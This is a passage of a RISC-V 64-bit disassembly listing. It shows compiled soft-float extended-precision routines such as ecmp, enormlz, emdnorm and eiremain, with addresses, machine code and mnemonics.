   12d90:	feb79de3          	bne	a5,a1,12d8a <emovi+0x6e>
   12d94:	bff1                	j	12d70 <emovi+0x54>
   12d96:	00658793          	addi	a5,a1,6
   12d9a:	00059223          	sh	zero,4(a1)
   12d9e:	1579                	addi	a0,a0,-2
   12da0:	1979                	addi	s2,s2,-2
   12da2:	00295703          	lhu	a4,2(s2)
   12da6:	0789                	addi	a5,a5,2
   12da8:	fee79f23          	sh	a4,-2(a5)
   12dac:	fea91ae3          	bne	s2,a0,12da0 <emovi+0x84>
   12db0:	00059c23          	sh	zero,24(a1)
   12db4:	bf75                	j	12d70 <emovi+0x54>

0000000000012db6 <ecmp>:
   12db6:	711d                	addi	sp,sp,-96
   12db8:	e4a6                	sd	s1,72(sp)
   12dba:	e0ca                	sd	s2,64(sp)
   12dbc:	ec86                	sd	ra,88(sp)
   12dbe:	e8a2                	sd	s0,80(sp)
   12dc0:	892a                	mv	s2,a0
   12dc2:	84ae                	mv	s1,a1
   12dc4:	f13ff0ef          	jal	ra,12cd6 <eisnan>
   12dc8:	e559                	bnez	a0,12e56 <ecmp+0xa0>
   12dca:	8526                	mv	a0,s1
   12dcc:	f0bff0ef          	jal	ra,12cd6 <eisnan>
   12dd0:	842a                	mv	s0,a0
   12dd2:	e151                	bnez	a0,12e56 <ecmp+0xa0>
   12dd4:	858a                	mv	a1,sp
   12dd6:	854a                	mv	a0,s2
   12dd8:	f45ff0ef          	jal	ra,12d1c <emovi>
   12ddc:	100c                	addi	a1,sp,32
   12dde:	8526                	mv	a0,s1
   12de0:	f3dff0ef          	jal	ra,12d1c <emovi>
   12de4:	00015703          	lhu	a4,0(sp)
   12de8:	02015783          	lhu	a5,32(sp)
   12dec:	02e78c63          	beq	a5,a4,12e24 <ecmp+0x6e>
   12df0:	4789                	li	a5,2
   12df2:	46e1                	li	a3,24
   12df4:	00f10633          	add	a2,sp,a5
   12df8:	00065603          	lhu	a2,0(a2) # ffffffffffff8000 <_end+0xfffffffffff374e0>
   12dfc:	e205                	bnez	a2,12e1c <ecmp+0x66>
   12dfe:	1010                	addi	a2,sp,32
   12e00:	963e                	add	a2,a2,a5
   12e02:	00065603          	lhu	a2,0(a2)
   12e06:	ea19                	bnez	a2,12e1c <ecmp+0x66>
   12e08:	0789                	addi	a5,a5,2
   12e0a:	fed795e3          	bne	a5,a3,12df4 <ecmp+0x3e>
   12e0e:	8522                	mv	a0,s0
   12e10:	60e6                	ld	ra,88(sp)
   12e12:	6446                	ld	s0,80(sp)
   12e14:	64a6                	ld	s1,72(sp)
   12e16:	6906                	ld	s2,64(sp)
   12e18:	6125                	addi	sp,sp,96
   12e1a:	8082                	ret
   12e1c:	4405                	li	s0,1
   12e1e:	db65                	beqz	a4,12e0e <ecmp+0x58>
   12e20:	547d                	li	s0,-1
   12e22:	b7f5                	j	12e0e <ecmp+0x58>
   12e24:	4605                	li	a2,1
   12e26:	c311                	beqz	a4,12e2a <ecmp+0x74>
   12e28:	567d                	li	a2,-1
   12e2a:	4781                	li	a5,0
   12e2c:	45e1                	li	a1,24
   12e2e:	00f10733          	add	a4,sp,a5
   12e32:	00075683          	lhu	a3,0(a4)
   12e36:	1018                	addi	a4,sp,32
   12e38:	973e                	add	a4,a4,a5
   12e3a:	00075703          	lhu	a4,0(a4)
   12e3e:	00e69663          	bne	a3,a4,12e4a <ecmp+0x94>
   12e42:	0789                	addi	a5,a5,2
   12e44:	feb795e3          	bne	a5,a1,12e2e <ecmp+0x78>
   12e48:	b7d9                	j	12e0e <ecmp+0x58>
   12e4a:	8432                	mv	s0,a2
   12e4c:	fcd761e3          	bltu	a4,a3,12e0e <ecmp+0x58>
   12e50:	40c0043b          	negw	s0,a2
   12e54:	bf6d                	j	12e0e <ecmp+0x58>
   12e56:	5479                	li	s0,-2
   12e58:	bf5d                	j	12e0e <ecmp+0x58>

0000000000012e5a <eisinf>:
   12e5a:	01255783          	lhu	a5,18(a0)
   12e5e:	fff7c793          	not	a5,a5
   12e62:	03179713          	slli	a4,a5,0x31
   12e66:	eb11                	bnez	a4,12e7a <eisinf+0x20>
   12e68:	1141                	addi	sp,sp,-16
   12e6a:	e406                	sd	ra,8(sp)
   12e6c:	e6bff0ef          	jal	ra,12cd6 <eisnan>
   12e70:	60a2                	ld	ra,8(sp)
   12e72:	00153513          	seqz	a0,a0
   12e76:	0141                	addi	sp,sp,16
   12e78:	8082                	ret
   12e7a:	4501                	li	a0,0
   12e7c:	8082                	ret

0000000000012e7e <einfin.isra.2>:
   12e7e:	01250793          	addi	a5,a0,18
   12e82:	0509                	addi	a0,a0,2
   12e84:	fe051f23          	sh	zero,-2(a0)
   12e88:	fef51de3          	bne	a0,a5,12e82 <einfin.isra.2+0x4>
   12e8c:	00055783          	lhu	a5,0(a0)
   12e90:	6721                	lui	a4,0x8
   12e92:	177d                	addi	a4,a4,-1
   12e94:	8fd9                	or	a5,a5,a4
   12e96:	00f51023          	sh	a5,0(a0)
   12e9a:	8082                	ret

0000000000012e9c <eshift.part.3>:
   12e9c:	7139                	addi	sp,sp,-64
   12e9e:	f822                	sd	s0,48(sp)
   12ea0:	ec4e                	sd	s3,24(sp)
   12ea2:	fc06                	sd	ra,56(sp)
   12ea4:	f426                	sd	s1,40(sp)
   12ea6:	f04a                	sd	s2,32(sp)
   12ea8:	e852                	sd	s4,16(sp)
   12eaa:	e456                	sd	s5,8(sp)
   12eac:	89aa                	mv	s3,a0
   12eae:	842e                	mv	s0,a1
   12eb0:	0a05d963          	bgez	a1,12f62 <eshift.part.3+0xc6>
   12eb4:	40b00a3b          	negw	s4,a1
   12eb8:	8952                	mv	s2,s4
   12eba:	4481                	li	s1,0
   12ebc:	4abd                	li	s5,15
   12ebe:	034ac763          	blt	s5,s4,12eec <eshift.part.3+0x50>
   12ec2:	0049591b          	srliw	s2,s2,0x4
   12ec6:	55c1                	li	a1,-16
   12ec8:	02b905bb          	mulw	a1,s2,a1
   12ecc:	4a1d                	li	s4,7
   12ece:	4085893b          	subw	s2,a1,s0
   12ed2:	844a                	mv	s0,s2
   12ed4:	032a4463          	blt	s4,s2,12efc <eshift.part.3+0x60>
   12ed8:	0034559b          	srliw	a1,s0,0x3
   12edc:	57e1                	li	a5,-8
   12ede:	02f585bb          	mulw	a1,a1,a5
   12ee2:	9c2d                	addw	s0,s0,a1
   12ee4:	e405                	bnez	s0,12f0c <eshift.part.3+0x70>
   12ee6:	00903533          	snez	a0,s1
   12eea:	a09d                	j	12f50 <eshift.part.3+0xb4>
   12eec:	0189d783          	lhu	a5,24(s3)
   12ef0:	854e                	mv	a0,s3
   12ef2:	3a41                	addiw	s4,s4,-16
   12ef4:	8cdd                	or	s1,s1,a5
   12ef6:	cfbff0ef          	jal	ra,12bf0 <eshdn6>
   12efa:	b7d1                	j	12ebe <eshift.part.3+0x22>
   12efc:	0189c783          	lbu	a5,24(s3)
   12f00:	854e                	mv	a0,s3
   12f02:	3961                	addiw	s2,s2,-8
   12f04:	8cdd                	or	s1,s1,a5
   12f06:	c89ff0ef          	jal	ra,12b8e <eshdn8>
   12f0a:	b7e9                	j	12ed4 <eshift.part.3+0x38>
   12f0c:	0189d783          	lhu	a5,24(s3)
   12f10:	854e                	mv	a0,s3
   12f12:	347d                	addiw	s0,s0,-1
   12f14:	8b85                	andi	a5,a5,1
   12f16:	8cdd                	or	s1,s1,a5
   12f18:	bfdff0ef          	jal	ra,12b14 <eshdn1>
   12f1c:	b7e1                	j	12ee4 <eshift.part.3+0x48>
   12f1e:	854e                	mv	a0,s3
   12f20:	cb5ff0ef          	jal	ra,12bd4 <eshup6>
   12f24:	34c1                	addiw	s1,s1,-16
   12f26:	fe994ce3          	blt	s2,s1,12f1e <eshift.part.3+0x82>
   12f2a:	0044559b          	srliw	a1,s0,0x4
   12f2e:	57c1                	li	a5,-16
   12f30:	02f585bb          	mulw	a1,a1,a5
   12f34:	491d                	li	s2,7
   12f36:	00b404bb          	addw	s1,s0,a1
   12f3a:	8426                	mv	s0,s1
   12f3c:	02994663          	blt	s2,s1,12f68 <eshift.part.3+0xcc>
   12f40:	0034559b          	srliw	a1,s0,0x3
   12f44:	57e1                	li	a5,-8
   12f46:	02f585bb          	mulw	a1,a1,a5
   12f4a:	9c2d                	addw	s0,s0,a1
   12f4c:	e01d                	bnez	s0,12f72 <eshift.part.3+0xd6>
   12f4e:	4501                	li	a0,0
   12f50:	70e2                	ld	ra,56(sp)
   12f52:	7442                	ld	s0,48(sp)
   12f54:	74a2                	ld	s1,40(sp)
   12f56:	7902                	ld	s2,32(sp)
   12f58:	69e2                	ld	s3,24(sp)
   12f5a:	6a42                	ld	s4,16(sp)
   12f5c:	6aa2                	ld	s5,8(sp)
   12f5e:	6121                	addi	sp,sp,64
   12f60:	8082                	ret
   12f62:	84ae                	mv	s1,a1
   12f64:	493d                	li	s2,15
   12f66:	b7c1                	j	12f26 <eshift.part.3+0x8a>
   12f68:	854e                	mv	a0,s3
   12f6a:	c4bff0ef          	jal	ra,12bb4 <eshup8>
   12f6e:	34e1                	addiw	s1,s1,-8
   12f70:	b7f1                	j	12f3c <eshift.part.3+0xa0>
   12f72:	854e                	mv	a0,s3
   12f74:	bd9ff0ef          	jal	ra,12b4c <eshup1>
   12f78:	347d                	addiw	s0,s0,-1
   12f7a:	bfc9                	j	12f4c <eshift.part.3+0xb0>

0000000000012f7c <enormlz>:
   12f7c:	00455783          	lhu	a5,4(a0)
   12f80:	1101                	addi	sp,sp,-32
   12f82:	e426                	sd	s1,8(sp)
   12f84:	ec06                	sd	ra,24(sp)
   12f86:	e822                	sd	s0,16(sp)
   12f88:	e04a                	sd	s2,0(sp)
   12f8a:	84aa                	mv	s1,a0
   12f8c:	efb9                	bnez	a5,12fea <enormlz+0x6e>
   12f8e:	00651783          	lh	a5,6(a0)
   12f92:	4401                	li	s0,0
   12f94:	0a000913          	li	s2,160
   12f98:	0007df63          	bgez	a5,12fb6 <enormlz+0x3a>
   12f9c:	8522                	mv	a0,s0
   12f9e:	60e2                	ld	ra,24(sp)
   12fa0:	6442                	ld	s0,16(sp)
   12fa2:	64a2                	ld	s1,8(sp)
   12fa4:	6902                	ld	s2,0(sp)
   12fa6:	6105                	addi	sp,sp,32
   12fa8:	8082                	ret
   12faa:	8526                	mv	a0,s1
   12fac:	2441                	addiw	s0,s0,16
   12fae:	c27ff0ef          	jal	ra,12bd4 <eshup6>
   12fb2:	ff2405e3          	beq	s0,s2,12f9c <enormlz+0x20>
   12fb6:	0064d783          	lhu	a5,6(s1)
   12fba:	dbe5                	beqz	a5,12faa <enormlz+0x2e>
   12fbc:	0064d783          	lhu	a5,6(s1)
   12fc0:	f007f793          	andi	a5,a5,-256
   12fc4:	cf91                	beqz	a5,12fe0 <enormlz+0x64>
   12fc6:	0a000913          	li	s2,160
   12fca:	00649783          	lh	a5,6(s1)
   12fce:	fc07c7e3          	bltz	a5,12f9c <enormlz+0x20>
   12fd2:	8526                	mv	a0,s1
   12fd4:	2405                	addiw	s0,s0,1
   12fd6:	b77ff0ef          	jal	ra,12b4c <eshup1>
   12fda:	fe8958e3          	ble	s0,s2,12fca <enormlz+0x4e>
   12fde:	bf7d                	j	12f9c <enormlz+0x20>
   12fe0:	8526                	mv	a0,s1
   12fe2:	bd3ff0ef          	jal	ra,12bb4 <eshup8>
   12fe6:	2421                	addiw	s0,s0,8
   12fe8:	bfd1                	j	12fbc <enormlz+0x40>
   12fea:	f007f793          	andi	a5,a5,-256
   12fee:	4401                	li	s0,0
   12ff0:	c781                	beqz	a5,12ff8 <enormlz+0x7c>
   12ff2:	b9dff0ef          	jal	ra,12b8e <eshdn8>
   12ff6:	5461                	li	s0,-8
   12ff8:	f7000913          	li	s2,-144
   12ffc:	a039                	j	1300a <enormlz+0x8e>
   12ffe:	8526                	mv	a0,s1
   13000:	347d                	addiw	s0,s0,-1
   13002:	b13ff0ef          	jal	ra,12b14 <eshdn1>
   13006:	f9244be3          	blt	s0,s2,12f9c <enormlz+0x20>
   1300a:	0044d783          	lhu	a5,4(s1)
   1300e:	fbe5                	bnez	a5,12ffe <enormlz+0x82>
   13010:	b771                	j	12f9c <enormlz+0x20>

0000000000013012 <enan.constprop.12>:
   13012:	01050793          	addi	a5,a0,16
   13016:	0509                	addi	a0,a0,2
   13018:	fe051f23          	sh	zero,-2(a0)
   1301c:	fef51de3          	bne	a0,a5,13016 <enan.constprop.12+0x4>
   13020:	77f1                	lui	a5,0xffffc
   13022:	00f51023          	sh	a5,0(a0)
   13026:	77e1                	lui	a5,0xffff8
   13028:	fff7c793          	not	a5,a5
   1302c:	00f51123          	sh	a5,2(a0)
   13030:	8082                	ret

0000000000013032 <emovo.isra.6>:
   13032:	872a                	mv	a4,a0
   13034:	00075683          	lhu	a3,0(a4) # 8000 <_start-0x80b0>
   13038:	852e                	mv	a0,a1
   1303a:	00275783          	lhu	a5,2(a4)
   1303e:	c299                	beqz	a3,13044 <emovo.isra.6+0x12>
   13040:	76e1                	lui	a3,0xffff8
   13042:	8fd5                	or	a5,a5,a3
   13044:	00f51923          	sh	a5,18(a0)
   13048:	00275603          	lhu	a2,2(a4)
   1304c:	66a1                	lui	a3,0x8
   1304e:	16fd                	addi	a3,a3,-1
   13050:	00670793          	addi	a5,a4,6
   13054:	00d61b63          	bne	a2,a3,1306a <emovo.isra.6+0x38>
   13058:	0769                	addi	a4,a4,26
   1305a:	0007d683          	lhu	a3,0(a5) # ffffffffffff8000 <_end+0xfffffffffff374e0>
   1305e:	e28d                	bnez	a3,13080 <emovo.isra.6+0x4e>
   13060:	0789                	addi	a5,a5,2
   13062:	fee79ce3          	bne	a5,a4,1305a <emovo.isra.6+0x28>
   13066:	e19ff06f          	j	12e7e <einfin.isra.2>
   1306a:	0541                	addi	a0,a0,16
   1306c:	0761                	addi	a4,a4,24
   1306e:	0789                	addi	a5,a5,2
   13070:	ffe7d683          	lhu	a3,-2(a5)
   13074:	1579                	addi	a0,a0,-2
   13076:	00d51123          	sh	a3,2(a0)
   1307a:	fee79ae3          	bne	a5,a4,1306e <emovo.isra.6+0x3c>
   1307e:	8082                	ret
   13080:	f93ff06f          	j	13012 <enan.constprop.12>

0000000000013084 <e113toe.isra.8>:
   13084:	7139                	addi	sp,sp,-64
   13086:	f426                	sd	s1,40(sp)
   13088:	84aa                	mv	s1,a0
   1308a:	850a                	mv	a0,sp
   1308c:	f822                	sd	s0,48(sp)
   1308e:	fc06                	sd	ra,56(sp)
   13090:	842e                	mv	s0,a1
   13092:	a2dff0ef          	jal	ra,12abe <ecleaz>
   13096:	00e4d703          	lhu	a4,14(s1)
   1309a:	0107179b          	slliw	a5,a4,0x10
   1309e:	4107d79b          	sraiw	a5,a5,0x10
   130a2:	0207c763          	bltz	a5,130d0 <e113toe.isra.8+0x4c>
   130a6:	00011023          	sh	zero,0(sp)
   130aa:	66a1                	lui	a3,0x8
   130ac:	16fd                	addi	a3,a3,-1
   130ae:	8f75                	and	a4,a4,a3
   130b0:	00e48793          	addi	a5,s1,14
   130b4:	04d71a63          	bne	a4,a3,13108 <e113toe.isra.8+0x84>
   130b8:	8726                	mv	a4,s1
   130ba:	00075683          	lhu	a3,0(a4)
   130be:	ce89                	beqz	a3,130d8 <e113toe.isra.8+0x54>
   130c0:	8522                	mv	a0,s0
   130c2:	f51ff0ef          	jal	ra,13012 <enan.constprop.12>
   130c6:	70e2                	ld	ra,56(sp)
   130c8:	7442                	ld	s0,48(sp)
   130ca:	74a2                	ld	s1,40(sp)
   130cc:	6121                	addi	sp,sp,64
   130ce:	8082                	ret
   130d0:	57fd                	li	a5,-1
   130d2:	00f11023          	sh	a5,0(sp)
   130d6:	bfd1                	j	130aa <e113toe.isra.8+0x26>
   130d8:	0709                	addi	a4,a4,2
   130da:	fee790e3          	bne	a5,a4,130ba <e113toe.isra.8+0x36>
   130de:	8522                	mv	a0,s0
   130e0:	9b9ff0ef          	jal	ra,12a98 <eclear>
   130e4:	8522                	mv	a0,s0
   130e6:	d99ff0ef          	jal	ra,12e7e <einfin.isra.2>
   130ea:	00e49783          	lh	a5,14(s1)
   130ee:	fc07dce3          	bgez	a5,130c6 <e113toe.isra.8+0x42>
   130f2:	8522                	mv	a0,s0
   130f4:	be3ff0ef          	jal	ra,12cd6 <eisnan>
   130f8:	f579                	bnez	a0,130c6 <e113toe.isra.8+0x42>
   130fa:	01245783          	lhu	a5,18(s0)
   130fe:	7761                	lui	a4,0xffff8
   13100:	8fb9                	xor	a5,a5,a4
   13102:	00f41923          	sh	a5,18(s0)
   13106:	b7c1                	j	130c6 <e113toe.isra.8+0x42>
   13108:	00e11123          	sh	a4,2(sp)
   1310c:	868a                	mv	a3,sp
   1310e:	17f9                	addi	a5,a5,-2
   13110:	0007d603          	lhu	a2,0(a5)
   13114:	0689                	addi	a3,a3,2
   13116:	00c69223          	sh	a2,4(a3) # 8004 <_start-0x80ac>
   1311a:	fef49ae3          	bne	s1,a5,1310e <e113toe.isra.8+0x8a>
   1311e:	eb01                	bnez	a4,1312e <e113toe.isra.8+0xaa>
   13120:	00011223          	sh	zero,4(sp)
   13124:	85a2                	mv	a1,s0
   13126:	850a                	mv	a0,sp
   13128:	f0bff0ef          	jal	ra,13032 <emovo.isra.6>
   1312c:	bf69                	j	130c6 <e113toe.isra.8+0x42>
   1312e:	4785                	li	a5,1
   13130:	55fd                	li	a1,-1
   13132:	850a                	mv	a0,sp
   13134:	00f11223          	sh	a5,4(sp)
   13138:	d65ff0ef          	jal	ra,12e9c <eshift.part.3>
   1313c:	b7e5                	j	13124 <e113toe.isra.8+0xa0>

000000000001313e <emdnorm>:
   1313e:	7139                	addi	sp,sp,-64
   13140:	f822                	sd	s0,48(sp)
   13142:	f426                	sd	s1,40(sp)
   13144:	f04a                	sd	s2,32(sp)
   13146:	ec4e                	sd	s3,24(sp)
   13148:	e852                	sd	s4,16(sp)
   1314a:	e456                	sd	s5,8(sp)
   1314c:	8936                	mv	s2,a3
   1314e:	843e                	mv	s0,a5
   13150:	fc06                	sd	ra,56(sp)
   13152:	84aa                	mv	s1,a0
   13154:	89ae                	mv	s3,a1
   13156:	8a32                	mv	s4,a2
   13158:	8aba                	mv	s5,a4
   1315a:	e23ff0ef          	jal	ra,12f7c <enormlz>
   1315e:	09000793          	li	a5,144
   13162:	40a90933          	sub	s2,s2,a0
   13166:	02a7d763          	ble	a0,a5,13194 <emdnorm+0x56>
   1316a:	67a1                	lui	a5,0x8
   1316c:	17f9                	addi	a5,a5,-2
   1316e:	2327c663          	blt	a5,s2,1339a <emdnorm+0x25c>
   13172:	00248793          	addi	a5,s1,2
   13176:	04e9                	addi	s1,s1,26
   13178:	0789                	addi	a5,a5,2
   1317a:	fe079f23          	sh	zero,-2(a5) # 7ffe <_start-0x80b2>
   1317e:	fe979de3          	bne	a5,s1,13178 <emdnorm+0x3a>
   13182:	70e2                	ld	ra,56(sp)
   13184:	7442                	ld	s0,48(sp)
   13186:	74a2                	ld	s1,40(sp)
   13188:	7902                	ld	s2,32(sp)
   1318a:	69e2                	ld	s3,24(sp)
   1318c:	6a42                	ld	s4,16(sp)
   1318e:	6aa2                	ld	s5,8(sp)
   13190:	6121                	addi	sp,sp,64
   13192:	8082                	ret
   13194:	00095d63          	bgez	s2,131ae <emdnorm+0x70>
   13198:	f7000793          	li	a5,-144
   1319c:	0ef94a63          	blt	s2,a5,13290 <emdnorm+0x152>
   131a0:	0009059b          	sext.w	a1,s2
   131a4:	8526                	mv	a0,s1
   131a6:	cf7ff0ef          	jal	ra,12e9c <eshift.part.3>
   131aa:	0e051c63          	bnez	a0,132a2 <emdnorm+0x164>
   131ae:	1a0a8a63          	beqz	s5,13362 <emdnorm+0x224>
   131b2:	4058                	lw	a4,4(s0)
   131b4:	401c                	lw	a5,0(s0)
   131b6:	04f70863          	beq	a4,a5,13206 <emdnorm+0xc8>
   131ba:	01a40513          	addi	a0,s0,26
   131be:	901ff0ef          	jal	ra,12abe <ecleaz>
   131c2:	405c                	lw	a5,4(s0)
   131c4:	03800713          	li	a4,56
   131c8:	10e78d63          	beq	a5,a4,132e2 <emdnorm+0x1a4>
   131cc:	0cf74d63          	blt	a4,a5,132a6 <emdnorm+0x168>
   131d0:	4761                	li	a4,24
   131d2:	12e78e63          	beq	a5,a4,1330e <emdnorm+0x1d0>
   131d6:	03500713          	li	a4,53
   131da:	12e78163          	beq	a5,a4,132fc <emdnorm+0x1be>
   131de:	80010737          	lui	a4,0x80010
   131e2:	377d                	addiw	a4,a4,-1
   131e4:	c858                	sw	a4,20(s0)
   131e6:	4705                	li	a4,1
   131e8:	00e41c23          	sh	a4,24(s0)
   131ec:	472d                	li	a4,11
   131ee:	1702                	slli	a4,a4,0x20
   131f0:	0731                	addi	a4,a4,12
   131f2:	e418                	sd	a4,8(s0)
   131f4:	4458                	lw	a4,12(s0)
   131f6:	01845683          	lhu	a3,24(s0)
   131fa:	0721                	addi	a4,a4,8
   131fc:	0706                	slli	a4,a4,0x1
   131fe:	9722                	add	a4,a4,s0
   13200:	00d71523          	sh	a3,10(a4) # ffffffff8001000a <_end+0xffffffff7ff4f4ea>
   13204:	c01c                	sw	a5,0(s0)
   13206:	01204f63          	bgtz	s2,13224 <emdnorm+0xe6>
   1320a:	4058                	lw	a4,4(s0)
   1320c:	09000793          	li	a5,144
   13210:	00f70a63          	beq	a4,a5,13224 <emdnorm+0xe6>
   13214:	0184d783          	lhu	a5,24(s1)
   13218:	8526                	mv	a0,s1
   1321a:	8b85                	andi	a5,a5,1
   1321c:	00f9e9b3          	or	s3,s3,a5
   13220:	8f5ff0ef          	jal	ra,12b14 <eshdn1>
   13224:	4414                	lw	a3,8(s0)
   13226:	01445583          	lhu	a1,20(s0)
   1322a:	4048                	lw	a0,4(s0)
   1322c:	00169793          	slli	a5,a3,0x1
   13230:	00f48633          	add	a2,s1,a5
   13234:	00065703          	lhu	a4,0(a2)
   13238:	8f6d                	and	a4,a4,a1
   1323a:	08f00593          	li	a1,143
   1323e:	00a5c863          	blt	a1,a0,1324e <emdnorm+0x110>
   13242:	0789                	addi	a5,a5,2
   13244:	2685                	addiw	a3,a3,1
   13246:	97a6                	add	a5,a5,s1
   13248:	45b1                	li	a1,12
   1324a:	0cd5df63          	ble	a3,a1,13328 <emdnorm+0x1ea>
   1324e:	01445783          	lhu	a5,20(s0)
   13252:	00065683          	lhu	a3,0(a2)
   13256:	fff7c793          	not	a5,a5
   1325a:	8ff5                	and	a5,a5,a3
   1325c:	00f61023          	sh	a5,0(a2)
   13260:	01645783          	lhu	a5,22(s0)
   13264:	00e7f6b3          	and	a3,a5,a4
   13268:	cee1                	beqz	a3,13340 <emdnorm+0x202>
   1326a:	00e79d63          	bne	a5,a4,13284 <emdnorm+0x146>
   1326e:	0c099763          	bnez	s3,1333c <emdnorm+0x1fe>
   13272:	445c                	lw	a5,12(s0)
   13274:	01845703          	lhu	a4,24(s0)
   13278:	0786                	slli	a5,a5,0x1
   1327a:	97a6                	add	a5,a5,s1
   1327c:	0007d783          	lhu	a5,0(a5)
   13280:	8ff9                	and	a5,a5,a4
   13282:	cfdd                	beqz	a5,13340 <emdnorm+0x202>
   13284:	85a6                	mv	a1,s1
   13286:	01a40513          	addi	a0,s0,26
   1328a:	989ff0ef          	jal	ra,12c12 <eaddm>
   1328e:	a84d                	j	13340 <emdnorm+0x202>
   13290:	00248793          	addi	a5,s1,2
   13294:	04e9                	addi	s1,s1,26
   13296:	0789                	addi	a5,a5,2
   13298:	fe079f23          	sh	zero,-2(a5)
   1329c:	fe979de3          	bne	a5,s1,13296 <emdnorm+0x158>
   132a0:	b5cd                	j	13182 <emdnorm+0x44>
   132a2:	4985                	li	s3,1
   132a4:	b729                	j	131ae <emdnorm+0x70>
   132a6:	04000713          	li	a4,64
   132aa:	02e78163          	beq	a5,a4,132cc <emdnorm+0x18e>
   132ae:	07100713          	li	a4,113
   132b2:	f2e796e3          	bne	a5,a4,131de <emdnorm+0xa0>
   132b6:	40008737          	lui	a4,0x40008
   132ba:	377d                	addiw	a4,a4,-1
   132bc:	c858                	sw	a4,20(s0)
   132be:	7761                	lui	a4,0xffff8
   132c0:	00e41c23          	sh	a4,24(s0)
   132c4:	4729                	li	a4,10
   132c6:	1702                	slli	a4,a4,0x20
   132c8:	0729                	addi	a4,a4,10
   132ca:	b725                	j	131f2 <emdnorm+0xb4>
   132cc:	80010737          	lui	a4,0x80010
   132d0:	377d                	addiw	a4,a4,-1
   132d2:	c858                	sw	a4,20(s0)
   132d4:	4705                	li	a4,1
   132d6:	00e41c23          	sh	a4,24(s0)
   132da:	470d                	li	a4,3
   132dc:	1706                	slli	a4,a4,0x21
   132de:	071d                	addi	a4,a4,7
   132e0:	bf09                	j	131f2 <emdnorm+0xb4>
   132e2:	00800737          	lui	a4,0x800
   132e6:	0ff7071b          	addiw	a4,a4,255
   132ea:	c858                	sw	a4,20(s0)
   132ec:	10000713          	li	a4,256
   132f0:	00e41c23          	sh	a4,24(s0)
   132f4:	4719                	li	a4,6
   132f6:	1702                	slli	a4,a4,0x20
   132f8:	0719                	addi	a4,a4,6
   132fa:	bde5                	j	131f2 <emdnorm+0xb4>
   132fc:	04000737          	lui	a4,0x4000
   13300:	7ff7071b          	addiw	a4,a4,2047
   13304:	c858                	sw	a4,20(s0)
   13306:	6705                	lui	a4,0x1
   13308:	8007071b          	addiw	a4,a4,-2048
   1330c:	b7d5                	j	132f0 <emdnorm+0x1b2>
   1330e:	00800737          	lui	a4,0x800
   13312:	0ff7071b          	addiw	a4,a4,255
   13316:	c858                	sw	a4,20(s0)
   13318:	10000713          	li	a4,256
   1331c:	00e41c23          	sh	a4,24(s0)
   13320:	4711                	li	a4,4
   13322:	1702                	slli	a4,a4,0x20
   13324:	0711                	addi	a4,a4,4
   13326:	b5f1                	j	131f2 <emdnorm+0xb4>
   13328:	0007d503          	lhu	a0,0(a5)
   1332c:	c119                	beqz	a0,13332 <emdnorm+0x1f4>
   1332e:	00176713          	ori	a4,a4,1
   13332:	00079023          	sh	zero,0(a5)
   13336:	2685                	addiw	a3,a3,1
   13338:	0789                	addi	a5,a5,2
   1333a:	bf01                	j	1324a <emdnorm+0x10c>
   1333c:	f40a04e3          	beqz	s4,13284 <emdnorm+0x146>
   13340:	01204a63          	bgtz	s2,13354 <emdnorm+0x216>
   13344:	4058                	lw	a4,4(s0)
   13346:	09000793          	li	a5,144
   1334a:	00f70563          	beq	a4,a5,13354 <emdnorm+0x216>
   1334e:	8526                	mv	a0,s1
   13350:	ffcff0ef          	jal	ra,12b4c <eshup1>
   13354:	0044d783          	lhu	a5,4(s1)
   13358:	c789                	beqz	a5,13362 <emdnorm+0x224>
   1335a:	8526                	mv	a0,s1
   1335c:	fb8ff0ef          	jal	ra,12b14 <eshdn1>
   13360:	0905                	addi	s2,s2,1
   13362:	67a1                	lui	a5,0x8
   13364:	00049c23          	sh	zero,24(s1)
   13368:	17f9                	addi	a5,a5,-2
   1336a:	0327d063          	ble	s2,a5,1338a <emdnorm+0x24c>
   1336e:	77e1                	lui	a5,0xffff8
   13370:	fff7c793          	not	a5,a5
   13374:	00f49123          	sh	a5,2(s1)
   13378:	00448793          	addi	a5,s1,4
   1337c:	04e1                	addi	s1,s1,24
   1337e:	00079023          	sh	zero,0(a5) # ffffffffffff8000 <_end+0xfffffffffff374e0>
   13382:	0789                	addi	a5,a5,2
   13384:	fef49de3          	bne	s1,a5,1337e <emdnorm+0x240>
   13388:	bbed                	j	13182 <emdnorm+0x44>
   1338a:	00095563          	bgez	s2,13394 <emdnorm+0x256>
   1338e:	00049123          	sh	zero,2(s1)
   13392:	bbc5                	j	13182 <emdnorm+0x44>
   13394:	01249123          	sh	s2,2(s1)
   13398:	b3ed                	j	13182 <emdnorm+0x44>
   1339a:	e00a9ce3          	bnez	s5,131b2 <emdnorm+0x74>
   1339e:	00049c23          	sh	zero,24(s1)
   133a2:	b7f1                	j	1336e <emdnorm+0x230>

00000000000133a4 <eiremain>:
   133a4:	7139                	addi	sp,sp,-64
   133a6:	e852                	sd	s4,16(sp)
   133a8:	00255a03          	lhu	s4,2(a0)
   133ac:	f822                	sd	s0,48(sp)
   133ae:	842e                	mv	s0,a1
   133b0:	fc06                	sd	ra,56(sp)
   133b2:	f426                	sd	s1,40(sp)
   133b4:	f04a                	sd	s2,32(sp)
   133b6:	e456                	sd	s5,8(sp)
   133b8:	e05a                	sd	s6,0(sp)
   133ba:	8932                	mv	s2,a2
   133bc:	03460b13          	addi	s6,a2,52
   133c0:	ec4e                	sd	s3,24(sp)
   133c2:	8aaa                	mv	s5,a0
   133c4:	bb9ff0ef          	jal	ra,12f7c <enormlz>
   133c8:	00245483          	lhu	s1,2(s0)
   133cc:	40aa0a33          	sub	s4,s4,a0
   133d0:	8522                	mv	a0,s0
   133d2:	babff0ef          	jal	ra,12f7c <enormlz>
   133d6:	8c89                	sub	s1,s1,a0
   133d8:	855a                	mv	a0,s6
   133da:	ee4ff0ef          	jal	ra,12abe <ecleaz>
   133de:	0344d363          	ble	s4,s1,13404 <eiremain+0x60>
   133e2:	8522                	mv	a0,s0
   133e4:	7442                	ld	s0,48(sp)
   133e6:	70e2                	ld	ra,56(sp)
   133e8:	69e2                	ld	s3,24(sp)
   133ea:	6a42                	ld	s4,16(sp)
   133ec:	6aa2                	ld	s5,8(sp)
   133ee:	6b02                	ld	s6,0(sp)
   133f0:	87ca                	mv	a5,s2
   133f2:	86a6                	mv	a3,s1
   133f4:	7902                	ld	s2,32(sp)
   133f6:	74a2                	ld	s1,40(sp)
   133f8:	4701                	li	a4,0
   133fa:	4601                	li	a2,0
   133fc:	4581                	li	a1,0
   133fe:	6121                	addi	sp,sp,64
   13400:	d3fff06f          	j	1313e <emdnorm>
